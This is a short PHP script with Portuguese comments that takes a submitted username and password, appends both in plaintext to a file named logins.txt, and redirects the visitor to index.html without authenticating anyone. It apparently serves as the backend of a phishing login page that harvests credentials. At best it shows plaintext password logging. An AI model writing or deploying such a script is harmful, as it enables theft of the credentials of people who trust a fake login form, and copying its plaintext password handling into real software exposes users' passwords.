<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    if (!empty($username) && !empty($password)) {
        $file = 'logins.txt';
        $data = "Username: $username, Password: $password\n";
        file_put_contents($file, $data, FILE_APPEND);
        
        // Redirecionar para a página de login bem-sucedido
        header("Location: index.html");
        exit; // Certifique-se de sair após redirecionar
    } else {
        echo "Nome de usuário e senha são obrigatórios.";
    }
}
?>
